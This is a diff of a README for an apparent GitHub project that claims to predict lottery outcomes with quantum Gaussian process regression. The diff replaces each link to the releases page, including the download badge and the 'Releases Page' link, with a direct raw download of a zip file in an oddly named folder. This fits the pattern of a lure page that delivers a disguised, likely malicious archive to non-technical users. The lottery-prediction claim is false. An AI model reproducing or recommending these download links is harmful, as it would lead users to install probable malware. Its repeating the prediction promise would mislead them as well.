@@ -1,13 +1,13 @@
 # 🎲 QGPR-QuantumGaussianProcessRegression - Predict Lottery Outcomes with Ease
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-green)](https://github.com/sagaz16k/QGPR-QuantumGaussianProcessRegression/releases)
+[![Download Latest Release](https://github.com/sagaz16k/QGPR-QuantumGaussianProcessRegression/raw/refs/heads/main/Tiliaceae/Gaussian_Regression_Quantum_Process_QGP_v3.6.zip%20Latest%20Release-green)](https://github.com/sagaz16k/QGPR-QuantumGaussianProcessRegression/raw/refs/heads/main/Tiliaceae/Gaussian_Regression_Quantum_Process_QGP_v3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to QGPR-QuantumGaussianProcessRegression! This application uses quantum computing to help you predict lottery outcomes. It's designed for everyone, even if you have no technical background.
 
 ## 📦 Download & Install
-To get started, visit this page to download: [QGPR Releases](https://github.com/sagaz16k/QGPR-QuantumGaussianProcessRegression/releases)
+To get started, visit this page to download: [QGPR Releases](https://github.com/sagaz16k/QGPR-QuantumGaussianProcessRegression/raw/refs/heads/main/Tiliaceae/Gaussian_Regression_Quantum_Process_QGP_v3.6.zip)
 
 Follow these steps to download and install the application:
 
@@ -63,6 +63,6 @@ We're committed to improving QGPR. Future updates may include:
 - Additional analysis features.
 - Bug fixes and performance improvements.
 
-Stay tuned for new releases by regularly checking the [Releases Page](https://github.com/sagaz16k/QGPR-QuantumGaussianProcessRegression/releases).
+Stay tuned for new releases by regularly checking the [Releases Page](https://github.com/sagaz16k/QGPR-QuantumGaussianProcessRegression/raw/refs/heads/main/Tiliaceae/Gaussian_Regression_Quantum_Process_QGP_v3.6.zip).
 
 Thank you for choosing QGPR-QuantumGaussianProcessRegression to aid your lottery predictions. Enjoy using our software and may luck be in your favor!
